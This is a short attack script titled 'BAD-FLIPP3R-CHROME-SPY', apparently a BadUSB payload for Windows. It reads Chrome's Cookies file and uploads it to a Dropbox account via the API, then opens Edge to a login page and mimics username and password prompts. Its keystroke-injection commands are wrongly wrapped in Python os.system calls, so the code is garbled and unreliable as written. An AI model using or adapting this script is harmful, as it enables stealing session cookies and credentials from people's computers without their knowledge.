echo # ####################################################
echo # #                                                  |
echo # # Title        : BAD-FLIPP3R-CHROME-SPY            |
echo # # Author       : BULLI77                           |
echo # # Version      : 1.0                               |
echo # # Category     : Exfiltration                      |
echo # # Target       : Windows                           |
echo # #                                                  |
echo # ####################################################


# Import the necessary modules
import os
import requests

# Define file paths
FILE_PATH = "/sdcard/cookies.txt"
DROPBOX_ACCESS_TOKEN = "example"

# Delay for 1 second
os.system("DELAY 1000")

# Open PowerShell
os.system("GUI r")
os.system("DELAY 500")
os.system("STRING powershell")
os.system("DELAY 500")
os.system("ENTER")
os.system("DELAY 2000")

# Get Chrome profile directory
chrome_profile_path = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
file_path = os.path.join(chrome_profile_path, 'Cookies')

# Setting about exfiltration
access_token = DROPBOX_ACCESS_TOKEN

auth_header = {"Authorization": f"Bearer {access_token}"}
dropbox_file_path = "/cookies_exported_cookies"
upload_url = "https://content.dropboxapi.com/2/files/upload"

headers = {"Authorization": f"Bearer {access_token}",
           "Dropbox-API-Arg": f'{{"path":"{dropbox_file_path}","mode":"add","autorename":true,"mute":false}}',
           "Content-Type": "application/octet-stream"}

# Use requests module instead of curl
with open(file_path, "rb") as file:
    response = requests.post(upload_url, headers=headers, files={"file": file})

# Delay for 1 second
os.system("DELAY 1000")

# Open Microsoft Edge
os.system("GUI r")
os.system("STRING MicrosoftEdge.exe")
os.system("DELAY 1000")

# Navigate to the login page
os.system("GUI t")
os.system("STRING https://example.com/login")
os.system("DELAY 1000")

# Get the username from the user
os.system("GUI r")
os.system("STRING Enter your username:")
os.system("DELAY 1000")
os.system("GUI t")
os.system("STRING {backspace 10}")
os.system("DELAY 1000")
os.system("GUI t")
os.system("STRING {enter}")
os.system("DELAY 1000")

# Get the password from the user
os.system("GUI r")
os.system("STRING Enter your password:")
os.system("DELAY 1000")
os.system("GUI t")
os.system("STRING {backspace 10}")
os.system("DELAY 1000")
os.system("GUI t")
os.system("STRING {enter}")
os.system("DELAY 1000")
